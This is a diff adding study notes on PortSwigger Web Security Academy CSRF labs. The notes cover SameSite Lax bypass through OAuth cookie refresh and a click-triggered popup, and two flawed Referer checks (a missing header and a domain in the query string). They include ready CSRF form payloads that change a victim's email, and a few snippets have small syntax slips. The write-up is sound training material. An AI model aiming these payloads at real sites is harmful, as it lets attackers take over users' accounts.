@@ -454,8 +454,163 @@ post/comment/confirmation?postId=../my-account/change-email?email=paein%40web-se
 - final script payload (append the host https://HOST/POST)
 ```
 <script>
-window.location=https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=paein%40web-security-academy.net%26submit=1" 
+document.location=https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=paein%40web-security-academy.net%26submit=1" 
 </script>
 ```
 
-## 9. SameSite Strict bypass via sibling domain
+## **9. SameSite Lax bypass via cookie refresh
+##### Study the change email function
+1. In Burp's browser, log in via your social media account and change your email address.
+2. In Burp, go to the **Proxy > HTTP history** tab.
+3. Study the `POST /my-account/change-email` request and notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSRF if you can bypass any SameSite cookie restrictions.
+4. Look at the response to the `GET /oauth-callback?code=[...]` request at the end of the [OAuth](https://portswigger.net/web-security/oauth) flow. Notice that the website doesn't explicitly specify any SameSite restrictions when setting session cookies. As a result, the browser will use the default `Lax` restriction level.
+
+##### Attempt a CSRF attack
+
+1. In the browser, go to the exploit server.
+2. Use the following template to create a basic CSRF attack for changing the victim's email address:
+```
+<script>
+    history.pushState('', '', '/')
+</script>
+
+<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="foo@bar.com" />
+    <input type="submit" value="Submit request" />
+</form>
+
+<script>
+    document.forms[0].submit();
+</script>
+```
+
+3. Store and view the exploit yourself. What happens next depends on how much time has elapsed since you logged in:
+    - If it has been longer than two minutes, you will be logged in via the OAuth flow, and the attack will fail. In this case, repeat this step immediately.
+    - If you logged in less than two minutes ago, the attack is successful and your email address is changed. From the **Proxy > HTTP history** tab, find the `POST /my-account/change-email` request and confirm that your session cookie was included even though this is a cross-site `POST` request.
+
+##### Bypass the SameSite restrictions
+1. In the browser, notice that if you visit `/social-login`, this automatically initiates the full OAuth flow. If you still have a logged-in session with the OAuth server, this all happens without any interaction.
+2. From the proxy history, notice that every time you complete the OAuth flow, the target site sets a new session cookie even if you were already logged in.
+3. Go back to the exploit server.
+4. Change the JavaScript so that the attack first refreshes the victim's session by forcing their browser to visit `/social-login`, then submits the email change request after a short pause. The following is one possible approach:
+```
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@web-security-academy.net">
+</form>
+
+ <script>
+     window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+     setTimeout(changeEmail, 5000);
+     function changeEmail(){
+        document.forms[0].submit();
+        }
+ </script>`
+```
+
+Note that we've opened the `/social-login` in a new window to avoid navigating away from the exploit before the change email request is sent.
+    
+5. Store and view the exploit yourself. Observe that the initial request gets blocked by the browser's popup blocker.  
+6. Observe that, after a pause, the CSRF attack is still launched. However, this is only successful if it has been less than two minutes since your cookie was set. If not, the attack fails because the popup blocker prevents the forced cookie refresh.
+
+
+##### Bypass the popup blocker
+1. Realize that the popup is being blocked because you haven't manually interacted with the page.
+2. Tweak the exploit so that it induces the victim to click on the page and only opens the popup once the user has clicked. The following is one possible approach:
+```
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@portswigger.net">
+</form>
+
+    <p>Click anywhere on the page</p>
+
+<script>
+     window.onclick = () => { window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+    setTimeout(changeEmail, 5000); }
+     function changeEmail() {
+     document.forms[0].submit(); 
+     }
+ </script>
+```
+3. Test the attack on yourself again while monitoring the proxy history in Burp.
+4. When prompted, click the page. This triggers the OAuth flow and issues you a new session cookie. After 5 seconds, notice that the CSRF attack is sent and the `POST /my-account/change-email` request includes your new session cookie.
+5. Go to your account page and confirm that your email address has changed.
+6. Change the email address in your exploit so that it doesn't match your own.
+7. Deliver the exploit to the victim to solve the lab.
+
+Analysis:
+![[Pasted image 20240925152141.png]]
+
+## **10. CSRF where Referer validation depends on header being present**
+This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.
+
+1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
+2. Send the request to Burp Repeater and observe that if you change the domain in the Referer HTTP header then the request is rejected.
+3. Delete the Referer header entirely and observe that the request is now accepted.
+4. Create and host a proof of concept exploit as described in the solution to the [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses) lab. Include the following HTML to suppress the Referer header:
+    `<meta name="referrer" content="no-referrer">`
+    
+5. Change the email address in your exploit so that it doesn't match your own.
+6. Store the exploit, then click "Deliver to victim" to solve the lab.
+
+
+In order for a CSRF attack to be possible:
+- A relevant action: change a users email
+- Cookie-based session handling: session cookie
+- No unpredictable request parameters: no csrf token
+
+Testing Referer header for CSRF attacks:
+1. Remove the Referer header
+
+- we generate and deliver the basic CSRF payload and we see that the website responds with "Invalid referer header" (it makes sure that the request is coming from the same domain as the website - if it is coming from anywhere else the request is rejected)
+![[Pasted image 20240925152932.png]]
+	![[Pasted image 20240925153036.png]]
+
+- we can see that our referer is http://burpsuite/ that is completely different from our domain
+![[Pasted image 20240925153207.png]]
+
+- we can spoof the referer header or to remove it and if the request is accepted without it we are ready to go 
+```
+<html>
+    <head>
+        <meta name="referrer" content="never">        REMOVING THE REFERRER HEADER
+    </head>
+
+    <!--NOTE: Since the Web Security Academy intoduced a defense in that does not allow iframes from different origins, the iframe needs to be removed.-->
+    <body>
+        <h1>Hello world!</h1>
+        <form action="https://0ab5007803da07dc80ad356300f6002f.web-security-academy.net/my-account/change-email" method = "post" id="csrf-form">
+            <input type="hidden" name="email" value="test6@test.ca">
+        </form>
+
+        <script>document.getElementById("csrf-form").submit()</script>
+    </body>
+</html>
+```
+
+## **11. CSRF with broken Referer validation**
+This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.
+
+1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
+2. Send the request to Burp Repeater. Observe that if you change the domain in the Referer HTTP header, the request is rejected.
+3. Copy the original domain of your lab instance and append it to the Referer header in the form of a query string. The result should look something like this:
+    `Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net`
+4. Send the request and observe that it is now accepted. The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string.
+5. Create a CSRF proof of concept exploit as described in the solution to the [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses) lab and host it on the exploit server. Edit the JavaScript so that the third argument of the `history.pushState()` function includes a query string with your lab instance URL as follows:
+    `history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")`
+    
+    This will cause the Referer header in the generated request to contain the URL of the target site in the query string, just like we tested earlier.
+    
+6. If you store the exploit and test it by clicking "View exploit", you may encounter the "invalid Referer header" error again. This is because many browsers now strip the query string from the Referer header by default as a security measure. To override this behavior and ensure that the full URL is included in the request, go back to the exploit server and add the following header to the "Head" section:
+    `Referrer-Policy: unsafe-url`
+
+
+In order for a CSRF attack to be possible:
+- A relevant action: change a users email
+- Cookie-based session handling: session cookie
+- No unpredictable request parameters (satisfied b/c no csrf token)
+
+Testing Referer header for CSRF attacks:
+1. Remove the Referer header
+2. Check which portion of the referrer header is the application validating
+
+
